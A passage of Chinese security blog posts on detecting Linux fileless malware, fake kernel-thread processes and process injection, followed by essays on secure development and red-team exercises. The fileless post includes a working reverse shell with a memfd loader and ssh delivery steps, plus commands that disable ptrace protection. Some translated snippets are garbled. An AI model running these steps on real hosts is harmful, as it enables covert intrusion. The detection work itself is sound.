[{"title":"Linux内核进程伪造检测","url":"/2020/06/22/Linux内核进程伪造检测/","content":"\n# Linux内核进程\n\n在Linux上，内核有许多进程被创建来帮助完成系统任务。这些进程可用于调度、磁盘I/O等。当您使用像`ps`这样的标准进程清单命令时，这些进程将显示为在它们周围有[括号]，以表示它们是某种类型的进程。在`ps`清单中，普通进程通常不会显示带方括号的进程。方括号没有命令行参数进程，这通常意味着它被派生为一个linux内核进程。\n\nLinux恶意软件使用各种技术来隐藏检测。他们使用的一种方法是，通过让进程在ps清单中围绕进程名称显示（括号）来模拟内核线程。这样，管理员就可以很容易地忽略恶意进程。\n\n![](/images/linux_kernel_process_masquerading/1.png)\n\n# 模拟内核进程\n\n```bash\nexport PATH=.:$PATH\ncp /bin/sleep /tmp/[kworkerd]\ncd /tmp\n\"[kworkerd]\" 3600 &\n```\n\n使用`export PATH`可以让程序在本地目录运行而不用添加`./`前缀。然后拷贝`sleep`命令到/tmp目录并伪造成`[kworkerd]`进程名。\n\n![](/images/linux_kernel_process_masquerading/2.png)\n\n# 检测伪造的内核进程\n\n**方法一：**检测`maps`\n\n```shell\nps auxww | grep \\\\[ | awk '{print $2}' | xargs -I % sh -c 'echo PID: %; cat /proc/%/maps' 2> /dev/null\n```\n\n![](/images/linux_kernel_process_masquerading/3.png)\n\n正常的内核进程maps内容为空的，伪装的内核进程是有内容标识的。\n\n**方法二：**检测`exe`\n\n```shell\nps auxww | grep \\\\[ | awk '{print $2}' | xargs -I % sh -c 'echo PID: %; sha1sum /proc/%/exe' 2> /dev/null\n```\n\n![](/images/linux_kernel_process_masquerading/4.png)\n\n正常内核进程没有相应的二进制文件，恶意的内核进程有对应的二进制文件。","tags":["内核进程","伪造进程"],"categories":["反入侵策略"]},{"title":"无文件攻击检测","url":"/2020/06/13/无文件攻击检测/","content":"\n# memfd_create() \n\n无文件恶意软件是设计来注入到正在运行的Linux系统，在磁盘没有留下任何痕迹。实现这一目标的方法有很多，但以下是一些比较有名的策略：\n\n- 执行二进制文件并从磁盘中删除它自己。\n- 代码注入到运行中的服务器，不写磁盘（例如，制作一个PHP服务器运行你输入的恶意php代码）。\n- 使用`ptrace()`等调试调用附加到正在运行的进程，并将代码插入内存空间中执行。\n- 使用`memfd_create()`等调用在RAM中创建一个可运行的匿名文件。\n\n`memfd_create()`调用允许你在Linux上创建内存驻留文件。这就像是把文件保存到RAM而不是文件系统本身。一旦完成此操作，就可以引用驻留内存的文件，并使其像使用标准磁盘目录中的任何文件一样运行。官网手册[man page describes](https://man7.org/linux/man-pages/man2/memfd_create.)：\n\n```shell\nmemfd_create() creates an anonymous file and returns a file descriptor that refers to it.  The file behaves like a regular file, and so can be modified, truncated, memory-mapped, and so on.  However, unlike a regular file, it lives in RAM and has a volatile backing storage.\n```\n\n类比在Linux主机上调用/bin/ls，替换成把ls加载到RAM中调用，并简单地将其称为<memory_longer_file_location>/ls。 现在，像许多系统调用一样，出于性能原因，它可以有合法的用途。然而，它也可能被恶意软件滥用，不希望被看到。此外，如果系统重新启动或被关闭的恶意软件被立即删除，这对于希望保护自己不被发现的入侵者来说是有价值的。\n\n# 执行攻击\n\n参考：https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html\n\nelfload.pl.head\n\n```perl\n#!/usr/bin/env perl\nuse warnings;\nuse strict;\n\n$|=1;\n\nmy $name = \"\";\nmy $fd = syscall(319, $name, 1);\nif (-1 == $fd) {\n        die \"memfd_create: $!\";\n}\n\nopen(my $FH, '>&='.$fd) or die \"open: $!\";\nselect((select($FH), $|=1)[0]);\n\nprint \"Writing ELF binary to memory...\";\n```\n\nelfload.pl.tail，ip需要改成需要反弹的ip\n\n```perl\n# Execute new program\nexec {\"/proc/$$/fd/$fd\"} \"[kworded/0:0]\", \"-addr\", \"100.1.1.1:4444\" or die \"exec: $!\";\n```\n\n反弹shell\n\n```go\npackage main\n\n/*\n * demoshell.go\n * Simple reverse shell used in demos\n * By J. Stuart McMurray\n * Created 20180331\n * Last Modified 20180331\n */\n\nimport (\n        \"flag\"\n        \"fmt\"\n        \"log\"\n        \"net\"\n        \"os\"\n        \"os/exec\"\n        \"time\"\n)\n\n/* Verbose logger */\nvar vlog = log.Printf\n\nfunc main() {\n        var (\n                addr = flag.String(\n                        \"addr\",\n                        \"127.0.0.1:4444\",\n                        \"Callback `adress`\",\n                )\n                sleep = flag.Duration(\n                        \"sleep\",\n                        2*time.Second,\n                        \"Sleep `duration` between callbacks\",\n                )\n                verbose = flag.Bool(\n                        \"v\",\n                        false,\n                        \"Print message for each connection\",\n                )\n        )\n        flag.Usage = func() {\n                fmt.Fprintf(\n                        os.Stderr,\n                        `Usage %v [options]\nCalls the address every so often and hooks up a shell to the network\nconnection.\nOptions:\n`,\n                        os.Args[0],\n                )\n                flag.PrintDefaults()\n        }\n        flag.Parse()\n\n        /* Unverbose just disables extra logging */\n        if !*verbose {\n                vlog = func(string, ...interface{}) {}\n        }\n\n        log.Printf(\"Starting shell callbacks to %v\", *addr)\n\n        for {\n                /* Try to make a shell */\n                if err := shell(*addr); nil != err {\n                        vlog(\"Error: %v\", err)\n                }\n                /* Sleep until the next one */\n                time.Sleep(*sleep)\n        }\n}\n\n/* shell connects to addr and hands it a shell */\nfunc shell(addr string) error {\n        /* Try to connect */\n        c, err := net.Dial(\"tcp\", addr)\n        if nil != err {\n                return err\n        }\n        vlog(\"Connected %v->%v\", c.LocalAddr(), c.RemoteAddr())\n        defer c.Close()\n\n        /* Make a shell to hook up */\n        s := exec.Command(\"/bin/sh\")\n        s.Stdin = c\n        s.Stdout = c\n        s.Stderr = c\n\n        /* Welcome the user */\n        fmt.Fprintf(c, \"Welcome!\\n\")\n\n        /* Start the shell */\n        return s.Run()\n}\n```\n\n编译成二进制\n\n```bash\ngo build -o demoshel demoshell.go\n```\n\n**具体攻击步骤：**\n\n```bash\n1. cat elfload.pl.head | tee elfload.pl\n2. perl -e '$/=\\32;print\"print \\$FH pack q/H*/, q/\".(unpack\"H*\").\"/\\ or die qq/write: \\$!/;\\n\"while(<>)' demoshell >> elfload.pl\n3. cat elfload.pl.tail | tee -a elfload.pl\n4. cat elfload.pl | ssh root@10.1.1.2 /bin/bash -c 'perl'\n```\n\n# 检测Fileless Linux Attacks\n\n```shell\nls -alR /proc/*/exe 2> /dev/null | grep memfd:.*\\(deleted\\)\n```\n\n此命令遍历/proc目录，查找所有正在运行的进程，看它们是否有一个形如：memfd:（deleted）的可执行路径。这个入口非常可疑，这种标识在无文件攻击很常见。\n\n![](/images/linux_fileless_attack/1.png)\n\n**其他检测**\n\n![](/images/linux_fileless_attack/2.png)\n\n根目录通常是在`/root`\n\n![](/images/linux_fileless_attack/3.png)\n\ncomm和cmdline命令不一样。comm通常是一个数字（fd）。\n\n![](/images/linux_fileless_attack/4.png)\n\nmaps中也有`/memfd: (deleted)`标志\n\n![](/images/linux_fileless_attack/5.png)\n\n# 检测总结\n\n- 打开怪异网络端口的进程。\n- 进程的名称试图看起来像一个内核线程。\n- 进程comm和cmdline文件没有引用相同的命令名\n- 进程通信只有一个字符长。\n- 进程当前工作目录在/root目录下。\n- Process exe指向删除的/memfd: ，而不是一个合法的二进制路径。\n- 进程maps文件显示相同的删除位置，而不是合法的二进制路径。\n- 进程环境显示SSH连接启动了这个奇怪的删除进程。","tags":["memfd_create","fileless"],"categories":["反入侵策略"]},{"title":"Linux进程注入检测","url":"/2020/06/03/Linux进程注入检测/","content":"\n# LD_PRELOAD\n\nLD_PRELOAD是启动时在进程中加载共享库的最简单，最流行的方法。该环境变量可以配置有指向共享库的路径，该路径要在任何其他共享对象之前加载。\n\n对于文中大多数案例，我们将使用[此处列出的GitHub中](https://github.com/gaffe23/linux-inject)可用的示例。让我们使用sample-target作为[目标流程](https://github.com/gaffe23/linux-inject/blob/master/sample-target.c)并使用[sample-library](https://github.com/gaffe23/linux-inject/blob/master/sample-library.c)作为我们将要注入的共享库。\n\n我们可以使用ldd工具检查加载到进程中的共享库。如果我们使用ldd执行样本目标二进制文件，则可以看到该信息。\n\n![](/images/linux_inject/1.png)\n\nLinux-vdso.so.1是一个[虚拟的动态共享对象](http://man7.org/linux/man-pages/man7/vdso.7.html)，内核在每个进程中自动将其映射到地址空间。根据不同的体系架构，它可以具有其他名称。\n\n![](/images/linux_inject/2.png)\n\nLibc.so.6是样本目标需要运行的动态库之一，而[ld-linux.so.2](https://linux.die.net/man/8/ld-linux.so)负责查找和加载共享库。通过使用readelf，我们可以看到如何在样本目标ELF文件中定义它。\n\n![](/images/linux_inject/3.png)\n\n现在，让我们设置LD_PRELOAD环境变量以通过执行来加载我们的库。\n\n```shell\nexport LD_PRELOAD = /home/ubuntu/linux-inject/sample-library.so; ldd /home/ubuntu/linux-inject/sample-target\n```\n\n![](/images/linux_inject/4.png)\n\n我们可以看到现在正在加载示例库。通过设置LD_DEBUG环境变量，我们还可以获得更多详细信息。\n\n```shell\nexport DEBUG = filename\n```\n\n![](/images/linux_inject/5.png)\n\n通过Osquery搜索恶意LD_PRELOAD用法的一种简单方法是查询[process_envs](https://osquery.io/schema/3.3.2#process_envs)表并查找设置了LD_PRELOAD环境变量的进程。\n\n```sql\nSELECT process_envs.pid as source_process_id, process_envs.key as environment_variable_key, process_envs.value as environment_variable_value, processes.name as source_process, processes.path as file_path, processes.cmdline as source_process_commandline, processes.cwd as current_working_directory, 'T1055' as event_attack_id, 'Process Injection' as event_attack_technique, 'Defense Evasion, Privilege Escalation' as event_attack_tactic FROM process_envs join processes USING (pid) WHERE key = 'LD_PRELOAD';\n```\n\n![](/images/linux_inject/6.png)\n\n由于某些监视和安全软件出于良性目的使用LD_PRELOAD，因此您必须使用LD_PRELOAD创建环境中已知进程的基准。\n\n我们在使用LD_PRELOAD时遇到的一些良性示例包括以下内容。\n\n- [Firefox在某些环境中](https://bugzilla-dev.allizom.org/show_bug.cgi?id=1268733)\n- [DynaTrace代理](https://www.dynatrace.com/support/help/technology-support/operating-systems/linux/operation/oneagent-files-and-logs-on-linux/)\n\n从攻击者的角度来看，使用LD_PRELOAD会带来一些不便-主要是需要重新启动要向其中注入代码的过程才能正常工作。后面会介绍不需要此限制的其他技术。\n\n除了LD_PRELOAD，攻击者还可以使用其他类似的技术来获得相同的结果。例如，通过设置LD_LIBRARY_PATH环境变量，可以指定一个目录，装载程序将在该目录中首先尝试找到所需的库，因此攻击者可以创建libc.so的修改版本或其他所需的共享库，并加载恶意代码。进入过程。\n\n最后，建议监视/etc/ld.so.conf和/etc/ld.so.conf.d/*.conf的更改，因为它们可以用于相同的目的。可以使用[Osquery的FIM功能](https://osquery.readthedocs.io/en/stable/deployment/file-integrity-monitoring/)，在file_paths配置中添加“ /etc/ld.so.conf”和“ /etc/ld.so.conf.d/%%”。\n\n# Ptrace 注入\n\n在[Linux的注入工具](https://github.com/gaffe23/linux-inject)可被用于通过使用ptrace的，类似于Windows中的公知的DLL注射技术来共享库加载到运行的进程。\n\n让我们看[一下它](https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdf)是[如何工作的](https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdf)。首先，我们使用[ptrace](https://github.com/gaffe23/linux-inject/blob/master/inject-x86_64.c#L254)()附加到目标进程，并注入加载库的代码。然后，[加载程序代码](https://github.com/gaffe23/linux-inject/blob/master/inject-x86_64.c#L26)使用malloc()分配内存，将共享库的路径复制到缓冲区，然后调用__libc_dlopen_mode()来加载共享库。\n\n```shell\n./inject -n sample-target sample-library.so\n```\n\n![](/images/linux_inject/7.png)\n\n失败了！发生了什么？\n\n它的源头是一个称为[Yamaha](https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/)的Linux安全模块，该模块为特定的内核功能（例如ptrace）实现了自主访问控制（DAC）。你可以通过查看`/proc/sys/kernel/yama/ptrace_scope`或使用`systemctl`来检查当前状态。\n\n![](/images/linux_inject/8.png)\n\n正如你可以在看[文档](https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/)，当ptrace_scope设置为1，只有一个父进程可以调试（这是在Ubuntu 18.04.2默认值）。设置为3时，无法使用ptrace调试任何进程，并且需要重新启动才能更改该值。\n\n从防御者的角度来看，这实际上很棒，因为这意味着攻击者必须在使用ptrace之前修改ptrace_scope的值。\n\n我们可以利用此优势，并利用Osquery的[system_controls](https://osquery.io/schema/3.3.2#system_controls)表查询ptrace_scope的当前配置值。\n\n```sql\nosquery> select * from system_controls WHERE name =='kernel.yama.ptrace_scope';\n```\n\n![](/images/linux_inject/9.png)\n\n您还可以在Osquery中利用以下计划的查询来监视ptrace_scope的更改。\n\n```yaml\n“ detection_ptrace_scope_changed”：{\n\n      “ platform”：“ linux”，\n\n      “ description”：“检测对kernel.yama.ptrace_scope的更改”，\n\n      “ query”：“从system_controls中选择名称，current_value，config_value\n\n  WHERE name =='kernel.yama.ptrace_scope';“，\n\n      “时间间隔”：3600，\n\n      “已删除”：false\n\n}    \n```\n\n我们还可以寻找ptrace_scope的当前值已从/etc/sysctl.conf中的原始值修改过的系统。\n\n```sql\nSELECT name, subsystem, current_value, config_value from system_controls WHERE name == 'kernel.yama.ptrace_scope' AND current_value != config_value;\n```\n\n或者，我们可以简单地检查始终允许使用ptrace的系统，并将其标记为潜在的安全问题。\n\n```sql\nSELECT name, subsystem, current_value, config_value from system_controls WHERE name == 'kernel.yama.ptrace_scope' AND current_value = 0;\n```\n\n更重要的是，当ptrace被阻止时，会记录一条Syslog消息，该消息可用于检测使用ptrace的失败尝试。\n\n```\nJun 10 20:59:24 ip-172-31-32-145 kernel: [955105.055910] ptrace attach of \"./sample-target\"[13134] was attempted by \"./inject -n sample-target sample-library.so\"[13148]\n```\n\n如果您已经在安全性堆栈中收集Syslog消息，建议您在系统中多次尝试使用ptrace时发出警报。\n\n在Osquery中，以下查询可用于监视此特定的syslog消息。\n\n```sql\nSELECT * from syslog WHERE tag ='kernel'AND message like'％ptrace attach％';\n```\n\n![](/images/linux_inject/10.png)\n\n好的，现在让我们回到linux-inject工具。为了使ptrace起作用，攻击者需要将ptrace_scope设置为0。\n\n```shell\necho 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope\n```\n\n![linux注入ptrace工作](https://marvel-b1-cdn.bc0a.com/f00000000037663/cdn-cybersecurity.att.com/blog-content/Blog-Images/linux_inject.jpg)\n\n![](/images/linux_inject/11.png)\n\n让我们使用Osquery的[process_memory_map](https://osquery.io/schema/3.3.2#process_memory_map)表查看进程内存。\n\n```sql\nSELECT process_memory_map.*, pid as mpid from process_memory_map WHERE pid in (select PID from processes where name LIKE '%sample-target');\n```\n\n![](/images/linux_inject/12.png)\n\n在其他公共内存区域中，我们可以看到一些我们已经熟悉的共享库（libc，ld等）。除此之外，还存在注入的库sample-library.so。\n\n我们知道我们正在寻找具有执行许可权的内存区域，我们也可以丢弃原始图像和标记为伪的区域。\n\n```sql\nSELECT count(distinct(process_memory_map.pid)) from process_memory_map LEFT JOIN processes USING (pid) WHERE process_memory_map.path LIKE '/%' and process_memory_map.pseudo != 1 AND process_memory_map.path != processes.path AND process_memory_map.permissions LIKE '%x%';\n```\n\n![](/images/linux_inject/13.png)\n\n该查询仍然过于广泛。让我们检查一下共享库最常见的路径是什么。\n\n```sql\nSELECT split(process_memory_map.path, '/', 0) AS folder, count(*) as cnt from process_memory_map LEFT JOIN processes USING (pid) WHERE process_memory_map.path LIKE '/%' AND process_memory_map.pseudo != 1 AND process_memory_map.path != processes.path AND process_memory_map.permissions LIKE '%x%' GROUP by folder order by cnt desc;\n```\n\n![](/images/linux_inject/14.png)\n\n这就说得通了; 我们可以创建一个忽略公共路径的查询。这将帮助我们寻找从非标准位置加载的共享库。\n\n```sql\nSELECT process_memory_map.*, pid as mpid from process_memory_map LEFT JOIN processes USING (pid) WHERE process_memory_map.path LIKE '/%' and process_memory_map.pseudo != 1 AND process_memory_map.path NOT LIKE '/lib/%' AND process_memory_map.path NOT LIKE '/usr/lib%' AND process_memory_map.path != processes.path AND process_memory_map.permissions LIKE '%x%';\n```\n\n![](/images/linux_inject/16.png)\n\n在许多情况下，攻击者在加载文件后会从磁盘上删除文件，从而使分析更加困难并避免检测。如果删除注入的.so文件，则可以使用以下查询进行验证，利用该查询来检测何时从磁盘删除了共享库。\n\n```sql\nSELECT process_memory_map.pid, process_memory_map.start, process_memory_map.end, process_memory_map.permissions, process_memory_map.offset, process_memory_map.path from process_memory_map LEFT join file USING (path) where pseudo != 1 AND process_memory_map.path NOT LIKE '/lib/%' AND process_memory_map.path NOT LIKE '/usr/lib%' AND process_memory_map.permissions LIKE '%x%' AND filename IS NULL and process_memory_map.inode !=0 AND process_memory_map.permissions = 'r-xp';\n```\n\n![](/images/linux_inject/17.png)\n\n在检测[目标进程中注入](https://github.com/gaffe23/linux-inject/blob/master/inject-x86_64.c#L26)的代码方面，我们可以使用以下Yara规则。\n\n![](/images/linux_inject/18.png)\n\n# ReflectiveSOInjection\n\n有趣的是，当我在Virustotal中搜索与这些模式匹配的ELF文件时，我很快发现流行的[Pupy RAT](https://github.com/n1nj4sec/pupy)实际上在Linux客户端中[使用Linux注入](https://github.com/n1nj4sec/pupy/blob/unstable/client/sources-linux/pupy.c#L21)。\n\n[ReflectiveSOInjection](https://github.com/infosecguerrilla/ReflectiveSOInjection)是基于linux-inject的工具。主要区别在于共享对象的注入方式。在linux-inject中，shellcode使用[__libc_dlopen_mode](https://github.com/gaffe23/linux-inject/blob/master/inject-x86.c#L52)加载共享对象。ReflectiveSOInjection [将共享库映射到内存](https://github.com/infosecguerrilla/ReflectiveSOInjection/blob/master/inject/src/inject.c#L40)，然后强制主程序调用ReflectiveLoader导出。所述[ReflectiveLoader](https://github.com/infosecguerrilla/ReflectiveSOInjection/blob/master/so/src/ReflectiveLoader.c)负责解析功能，负载所需的库和节目段映射到存储器中。\n\n让我们在与linux-inject一起使用的相同样本目标上使用ReflectiveSOInjection。\n\n![](/images/linux_inject/19.png)\n\n如果我们看一下内存映射，我们可以看到有一个新的内存[部分标记为rwxp](https://github.com/infosecguerrilla/ReflectiveSOInjection/blob/master/inject/src/inject.c#L56)且具有空路径。\n\n![](/images/linux_inject/20.png)\n\n此方法的优点是注入的共享对象不必在磁盘上。我们可以使用以下查询来搜寻此活动。\n\n```sql\nSELECT processes.name, process_memory_map.*, pid as mpid from process_memory_map join processes USING (pid) WHERE process_memory_map.permissions = 'rwxp' AND process_memory_map.path = '';\n```\n\n作为额外检测，如果攻击者是懒惰的并且没有修改ReflectiveSOInjection代码，则默认情况下，该代码正在注入的共享库中查找名称为“ ReflectiveLoader”的导出。因此，我们可以编写一个简单的Yara签名来检测具有该导出功能的磁盘上的共享库。\n\n```yaml\nimport \"elf\"\n\nrule ReflectiveLoader : LinuxMalware {\n                  meta:\n                                    author = \"AlienVault Labs\"\n                                    description = \"Detects a shared object with the name of an export used by ReflectiveLoader\"\n                                    reference = \"https://github.com/infosecguerrilla/ReflectiveSOInjection\"\n                  condition:\n                                    uint32(0) == 0x464c457f and\n                                    elf.type == elf.ET_DYN and\n                                    for any i in (0..elf.symtab_entries): (\n                                                      elf.symtab[i].name == \"ReflectiveLoader\"\n                                    ) \n}\n```\n\n# GDB调试\n\n我们要探索的最后一种方法是使用Gnu Project Debugger [GDB](https://www.gnu.org/software/gdb/)加载共享对象。从攻击者的角度来看，GDB可能已经安装在目标系统中，并且噪音不如自带工具。使用GDB方法的优点是我们可以利用它。\n\n在幕后，这种方法几乎与linux-inject完全相同。GDB使用ptrace附加到进程，然后调用我们熟悉的相同的__libc_dlopen_mode()函数来加载共享对象。\n\n![使用ptrace的gdb](/images/linux_inject/23.png)\n\n结果与linux-inject相同，我们可以使用相同的查询来寻找。\n\n![](/images/linux_inject/21.png)\n\n总之，我们分析了攻击者可以通过多种方式将共享对象注入正在运行的进程中，并且共享了不同的Osquery查询和检测想法，蓝队可以使用这些查询和检测想法来在其环境中寻找这种行为。\n\n# 总结\n\n监控方法归纳成两种，一种是上文归纳的监控主机文件和map的变化：\n\n- 进程`LD_PRELOAD`变量监控\n- 监控文件`/etc/ld.so.*`和`/etc/ld.so.conf.d/*`完整性变化\n- 检测`/proc/[pid]/maps`中permissions为rwxp并且path为空\n- 检测`/proc/[pid]/maps`中path中so文件路径为非常规的路径（或者有deleted标志），`dpkg -S [so_path]`或者`rpm -qf [so_path]`可以判断是否是系统的包，需要注意的是`LD_PRELOAD`和`/etc/ld.so.*`定义的白名单可能会导致误报。\n\n第二种方法可通过监控内核`ptrace`事件，当然`pdb`调试时候也会产生相应的事件，但是生产环境就不应该有调试的动作，所以正常情况不是误报，如果有特殊情况再特殊对待。\n\n![](/images/linux_inject/22.png)\n\n\n\n**参考：**\n\nhttps://www.trustedsec.com/blog/linux-hows-my-memory/\n\nhttps://cybersecurity.att.com/blogs/labs-research/hunting-for-linux-library-injection-with-osquery\n\nhttps://xz.aliyun.com/t/6883","tags":["进程注入","ptrace"],"categories":["反入侵策略"]},{"title":"SDL浅谈","url":"/2020/05/11/SDL浅谈/","content":"\n SDL浅谈\n\nSDL简介 SDL security development lifecycle（安全开发生命周期），是微软提出的从安全角度指导软件开发过程的管理模式。SDL是一个安全保证的过程，起重点是软件开发，它在开发的所有阶段都引入了安全和隐私的原则。自2004年起，SDL一直都是微软在全公司实施的强制性策略。 \n\n# SDL阶段\n\n微软把SDL分为10多个阶段，太多冗余繁琐，并不利于我们在快速迭代的互联网中推动， 为了快速推动落地可以把SDL从流程维度分为五个阶段：需求、设计、实施、测试、上线、运维。\n\n ![img](/images/sdl/1.png)  \n\n# SDL流程推动\n\n## 参与人员\n\n主要参与人员有开发、测试、运维、安全、产品经理等人员，开发包括项目经理、架构师、开发人员等。\n\n## 方式\n\n推动方式是指沟通方式，有会议交流、邮件交流、面对面交流、甚至有电话沟通。\n\n## 文档\n\n安全人员推动过程中制定为研发、测试、运维提供理论、培训、规范的文档，包括不限于：安全意识培训PPT文档、安全需求CHECKLIST EXCEL表格、安全编码规范WORD文档、漏洞修复培训PPT文档、各类基线EXCEL表格、入侵检测CHECKLIST EXECEL表格等，这些文档在FREEBUF等安全媒体平台上可以获取到。\n\n# 具体流程实现\n\n## 立项\n\n### 安全需求分析\n\n明确数据安全目标和合规目标，产品经理是主要责任人，安全部提供赋能培训、演练与试点辅导等服务。同时安全部提供一系列的安全服务，协助产品经理实现安全闭环。 \n\n### 威胁建模\n\n常用的是微软STRIDE威胁分析模型。\n\n![img](/images/sdl/2.png) \n\n威胁建模一定要简单，以暴露面为主，核心就是认证授权和数据处理等红线。\n\n### 安全规范\n\n**安全设计：**为主要场景下的安全措施设计提供一致的文本参考标准和检查标准，安全部提供推广培训、简易CheckList和合规审核等服务。 \n\n**安全组件与平台**：为安全设计规范合规提供标准化的技术实现，降低安全措施的设计与实施的门槛。安全部负责安全组件与平台的需求收集、设计与推广服务，协助其他部门开发。安全部提供桥梁服务，将个别产品线的优秀安全组件或服务推广到其他产品线。 \n\n**安全编码规范**：为安全设计规范合规提供标准化的技术实现，降低安全措施的设计与实施的门槛。安全部负责安全组件与平台的需求收集、设计与推广服务，协助其他部门开发。安全部提供桥梁服务，将个别产品线的优秀安全组件或服务推广到其他产品线。 \n\n### 安全培训\n\n线下形式有PPT演讲，线上形式有安全视频培训，真实案例分享等。笔者还开发基于真实案例的训战平台，通过docker容器作为漏洞靶场的形式，夺取flag，在做题过程中帮助大家学习漏洞原理，提高安全意识。\n\n## 实施\n\n### 编码规范检测\n\n 安全编码规范条目不宜过多，互联网从业者总结的经验是10条左右，条目过多容易分散学习者和审计者的精力，难以达到预期的效果。  安全编码规范不能简单等同于安全编码知识库，了解到的一些单位，其安全编码规范通常是从网络、兄弟单位或标准化机构借用过来的常见漏洞的解决方案，缺乏针对性，我们建议针对一个轮次中（比如一年）代码人工审计和工具扫描的结果进行统计排序，排名靠前并且风险重大的安全编码漏洞及其解决方案建议写入安全编码规范，并且在新一轮年度工作中作为安全编码检查重点，重点消除这些安全编码漏洞。\n\n### 代码白盒安全扫描平台\n\n![img](/images/sdl/3.png) \n\n可以通过配置，自动连接代码仓库。在DevOps平台中自动执行上线前的代码审计扫描，扫描报告发送到安全团队邮箱进行报告复核。开源的可以使用`Findbugs+SonarRQube`进行代码审计，商业的可以使用`fortify`。\n\n## 测试\n\n### 渗透测试\n\n推动渗透测试人员与产品经理、开发经理合作，获取并理解需求，获取代码更新比对信息，在持续迭代过程中，渗透测试资源倾斜到那些新增或变更数据、功能和接口上，将资源聚焦，避免重复测试，将渗透测试由黑盒转变为灰白盒。\n\n### 自动化扫描\n\n黑盒就是被动方式，收集各个地方的流量，测试环境、线上流量都有覆盖，然后清洗入库再消费，加上 payload 重放，不过线上环境很小心，要兼顾 qps 和去ticket，避免造成生成事故。 一般大型互联网都是自研扫描器，前期投入比较有限，可以使用wvs扫描器或其他开源扫描器。\n\n## 运维\n\n### 发布前检测\n\n包括上线前的三方库检测，项目部署所在系统的安全加固，以及上线前发布系统恶意软件引入的检测等。\n\n### 发布后运营\n\n主机入侵检测hids必不可少的，前期可以使用开源框架驭龙，后期组建起安全团队可以自己研发或者基于开源做二次开发。做好hids后，最重要的工作就是运营hids，跟进入侵事件，并且不断研究新case补充hids策略。\n\n如果公司资源够，也可以组建SRC团队，主要负责应急响应和集合白帽子的力量挖掘公司的漏洞。这期间需要开发的项目就包括漏洞管理平台和SRC平台。这两个平台也都有开源产品，可以使用开源产品进行二次改造，尤其是漏洞管理平台，应该要复用或者对接自动化扫描的漏洞管理平台，能有效的对接公司的工单系统，保证漏洞能发送到责任人并做相应的闭环。\n\n\n\n**参考：**\n\nhttps://www.freebuf.com/articles/security-management/233899.html \n\nhttps://zhuanlan.zhihu.com/p/137766604\n\nhttps://www.secrss.com/articles/8784\n\nhttps://www.secrss.com/articles/8784 ","tags":["SDL","自动化"],"categories":["安全杂谈"]},{"title":"红蓝对抗浅谈","url":"/2020/04/30/红蓝对抗浅谈/","content":"\n\n\n# 什么是红蓝对抗\n\n在军事领域，演习是专指军队进行大规模的实兵演习，演习中通常分为红军、蓝军，演习多以红军守、蓝军进攻为主。类似于军事领域的红蓝军对抗，网络安全中，红蓝军对抗则是一方扮演黑客（蓝军），一方扮演防御者（红军）。在国外的话，进行渗透攻击的团队经常称做红队，在国内称为蓝队实际上应该是比较准确的叫法。\n\n# 红蓝对抗的目的\n\n安全是一个整体，正如木桶定律，最短的木板是评估木桶品质的标准，安全最薄弱环节也是决定系统好坏的关键。而网络红蓝军对抗的目的就是用来评估企业安全性，有助于找出企业安全中最脆弱的环节，提升企业安全能力的建设。\n\n# 红蓝对抗关注点\n\n其实红蓝对抗点没有统一的标准，因为很多会涉及到业务以及内网攻击的场景，所以个人认为红蓝团队比较适合甲方团队自己组建，这样信息资源比较可控，做的也会更细致。\n\n## 中小型互联网红蓝对抗\n\n例如曾经在中小型互联网公司做的红蓝对抗点：\n\n1. 外网web安全\n2. 办公网安全\n3. IDC主机安全\n4. DB专项\n\n这边web安全的关注点会不同于渗透测试的团队，例如红蓝团队就会关注一些敏感文件泄漏、管理后台暴露、waf有效性、waf防御效果、违规使用的框架等。再例如办公网安全红蓝团队还会关注安全助手的一些问题，也就是说红蓝团队关注的不仅是应用服务的漏洞，各个安全组件的效果、漏洞都会关注到。\n\n## 大型互联网红蓝对抗\n\n上面都是按照一个个大项来进行，其实还有的红蓝团队是按项目来分，比如说xx支付业务红蓝对抗，给你域名或者ip，让你自由发挥，不限方法拿到目标flag（例如xx支付的数据或者机器权限等），这个过程不要求**测的全，以结果为导向**。然后红队（防御方）尽可能复盘补漏，把不完善的地方都补齐。后面可以继续进行对抗演练，继续找出薄弱点，这边很考验红队的技术和业务的了解程度，能从蓝队的攻击链路中，找出尽可能多的脆弱点，做出防御策略。所以，我觉得红蓝对抗还是得根据公司的规模、安全人员的比例、技术人员的素养做制定，都按同一套标准是不会适用所有公司的。我的建议就是中小规模公司的红蓝对抗点尽可能覆盖全，尽可能找出全量的脆弱点让红队的人员进行修复后进行新一轮对抗。而大公司就可以不用考虑面面俱到，以夺取目标结果为导向，脆弱点由红队自己发现，红队自己修复，而后周期的进行红蓝对抗。可以看出大公司的红蓝对抗更类似于APT攻击，这也正是大公司蓝队喜欢招APT人员的关系。\n\n### 制定目标，梳理攻击线路图\n\n大型互联网一般以单项进行红蓝对抗，典型的案例包括云上的红蓝对抗等。梳理攻击线路这部分很关键，尽可能全的梳理出所有的攻击路径，每个路径去尝试突破。\n\n**目标：**攻击云上OM区（堡垒机、运维机）\n\n**梳理攻击线路图样例：**\n\n1. 利用社工获取运维人员电脑权限->接入运维网络->OM区\n2. 利用VPN漏洞、弱口令->接入运维网络->OM区\n3. 利用POD区域服务漏洞->OM区\n4. 利用DMZ服务漏洞占领服务主机->通过console和API网关漏洞->OM区\n5. 利用租户漏洞占领租户主机->逃逸漏洞至主机->OM区\n6. CDN节点->DMZ区->OM区\n\n### 实施目标\n\n实施目标就按照上面梳理出的路径逐条攻破，在这个过程中以占领最终的目标为导向即可。攻击线路中可能会用到很多不同技术和脆弱点，不必面面俱到。因为这一部分和红军复盘时候，会有所补充。而且红蓝的对抗是个持续的过程，不是一轮就能发现暴露所有问题，需要不定期的安全演练持续的促进安全。 \n\n### 攻击手段参考\n\n![](/images/hldk/1.png)\n\n# 红蓝对抗测试的方法\n\n如果是中小型的互联网企业的话，我的方法是先预先讨论好并记录下脑图，然后\n\n1. 按专项测试\n2. 每个专项包含很多点，按点排期测试\n3. 报告撰写，漏洞闭环\n4. 例行扫描\n5. 